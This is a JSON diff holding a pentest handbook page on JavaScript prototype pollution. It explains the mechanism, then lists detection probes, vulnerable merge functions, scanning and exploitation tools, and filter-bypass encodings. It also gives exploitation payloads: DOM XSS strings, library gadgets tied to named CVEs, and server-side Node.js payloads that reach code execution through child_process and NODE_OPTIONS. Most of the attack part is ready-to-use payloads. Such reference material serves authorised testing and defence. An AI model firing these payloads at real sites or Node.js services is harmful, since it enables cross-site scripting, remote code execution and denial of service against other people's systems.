@@ -1,0 +1,231 @@
+{
+    "title": "Prototype Pollution",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "How It Works",
+            "type": "code_block",
+            "content": [
+                "// JavaScript objects inherit from Object.prototype",
+                "let obj = {};",
+                "console.log(obj.toString); // inherited from Object.prototype",
+                "",
+                "// Pollution occurs when attacker controls property assignment",
+                "obj.__proto__.polluted = \"yes\";",
+                "// OR",
+                "obj[\"__proto__\"][\"polluted\"] = \"yes\";",
+                "// OR",
+                "obj.constructor.prototype.polluted = \"yes\";",
+                "",
+                "// Now ALL objects have this property",
+                "let newObj = {};",
+                "console.log(newObj.polluted); // \"yes\""
+            ]
+        },
+        {
+            "heading": "Detection",
+            "subheadings": [
+                {
+                    "heading": "Manual Testing",
+                    "type": "code_block",
+                    "content": [
+                        "// Test in browser console or via URL parameters",
+                        "// Check if prototype is pollutable",
+                        "",
+                        "// Via URL query string",
+                        "?__proto__[test]=polluted",
+                        "?__proto__.test=polluted",
+                        "?constructor[prototype][test]=polluted",
+                        "",
+                        "// Via JSON body",
+                        "{\"__proto__\": {\"test\": \"polluted\"}}",
+                        "{\"constructor\": {\"prototype\": {\"test\": \"polluted\"}}}",
+                        "",
+                        "// Verify pollution",
+                        "Object.prototype.test === \"polluted\""
+                    ]
+                },
+                {
+                    "heading": "Automated Detection",
+                    "type": "code_block",
+                    "content": [
+                        "# PPScan - Prototype Pollution Scanner",
+                        "# https://github.com/AhmedMohamedDev/PPScan",
+                        "python3 ppscan.py -u \"https://target.com/?param=value\"",
+                        "",
+                        "# Client-side prototype pollution scanner",
+                        "# https://github.com/AhmedMohamedDev/ClientSidePrototypePollution",
+                        "node ClientSidePrototypePollution.js -u \"https://target.com\"",
+                        "",
+                        "# Burp extension - Server-Side Prototype Pollution Scanner",
+                        "# https://github.com/AhmedMohamedDev/Burp-PrototypePollutionScanner",
+                        "",
+                        "# ppmap - Prototype Pollution Exploiter",
+                        "# https://github.com/AhmedMohamedDev/ppmap",
+                        "ppmap -u \"https://target.com\""
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Common Sinks (Client-Side)",
+            "type": "code_block",
+            "content": [
+                "// Object.assign",
+                "Object.assign({}, userInput);",
+                "",
+                "// Lodash merge (before 4.17.21)",
+                "_.merge({}, userInput);",
+                "_.set({}, path, value);",
+                "_.setWith({}, path, value);",
+                "",
+                "// jQuery extend",
+                "$.extend(true, {}, userInput);",
+                "",
+                "// Deep merge libraries",
+                "deepmerge({}, userInput);"
+            ]
+        },
+        {
+            "heading": "Exploitation Payloads",
+            "subheadings": [
+                {
+                    "heading": "DOM XSS via Prototype Pollution",
+                    "type": "code_block",
+                    "content": [
+                        "// If application uses innerHTML with polluted properties",
+                        "?__proto__[innerHTML]=<img/src/onerror=alert(1)>",
+                        "",
+                        "// Pollute srcdoc for iframes",
+                        "?__proto__[srcdoc]=<script>alert(1)</script>",
+                        "",
+                        "// Pollute href for anchors",
+                        "?__proto__[href]=javascript:alert(1)"
+                    ]
+                },
+                {
+                    "heading": "Gadgets for Common Libraries",
+                    "type": "code_block",
+                    "content": [
+                        "// jQuery < 3.4.0 (CVE-2019-11358)",
+                        "$.extend(true, {}, JSON.parse('{\"__proto__\": {\"test\": \"alert(1)\"}}'));",
+                        "",
+                        "// Lodash < 4.17.12 (CVE-2019-10744)",
+                        "_.template('', {variable: 'x'}); // with polluted sourceURL",
+                        "?__proto__[sourceURL]=\\u000aAlert(1)//",
+                        "",
+                        "// Vue.js",
+                        "?__proto__[v-if]=_c.constructor('alert(1)')()",
+                        "",
+                        "// Handlebars",
+                        "?__proto__[pendingContent]=<script>alert(1)</script>",
+                        "",
+                        "// Pug/Jade",
+                        "?__proto__[block]={\"type\":\"Text\",\"val\":\"<script>alert(1)</script>\"}"
+                    ]
+                },
+                {
+                    "heading": "Server-Side Prototype Pollution (Node.js)",
+                    "type": "code_block",
+                    "content": [
+                        "// RCE via child_process",
+                        "{\"__proto__\": {\"shell\": \"/proc/self/exe\", \"argv0\": \"console.log(require('child_process').execSync('id').toString())//\"}}",
+                        "",
+                        "// RCE via env pollution",
+                        "{\"__proto__\": {\"env\": {\"NODE_OPTIONS\": \"--require /proc/self/fd/0\"}}}",
+                        "",
+                        "// DoS via constructor pollution",
+                        "{\"__proto__\": {\"toString\": \"not a function\"}}"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Bypass Techniques",
+            "type": "code_block",
+            "content": [
+                "// Alternative property paths",
+                "constructor.prototype.polluted=1",
+                "__proto__.polluted=1",
+                "__proto__[polluted]=1",
+                "",
+                "// Unicode encoding",
+                "\\u005f\\u005fproto\\u005f\\u005f",
+                "",
+                "// Mixed case (rare)",
+                "__PROTO__",
+                "",
+                "// Array pollution",
+                "[].__proto__.polluted=1"
+            ]
+        },
+        {
+            "heading": "Tools & Resources",
+            "type": "code_block",
+            "content": [
+                "# Scanning",
+                "https://github.com/AhmedMohamedDev/PPScan",
+                "https://github.com/AhmedMohamedDev/ClientSidePrototypePollution",
+                "https://github.com/AhmedMohamedDev/ppmap",
+                "",
+                "# Gadget database",
+                "https://github.com/AhmedMohamedDev/client-side-prototype-pollution",
+                "",
+                "# Burp Extension",
+                "https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8"
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "list",
+            "content": [
+                "XSS - Prototype pollution often chains to XSS",
+                "Deserialization - Similar object manipulation concepts",
+                "SSTI - Template engines can be affected"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/prototype-pollution.md",
+        "previous_page": {
+            "title": "SSTI",
+            "url": "/enumeration/web/ssti"
+        },
+        "next_page": {
+            "title": "Command Injection",
+            "url": "/enumeration/web/command-injection"
+        }
+    }
+}
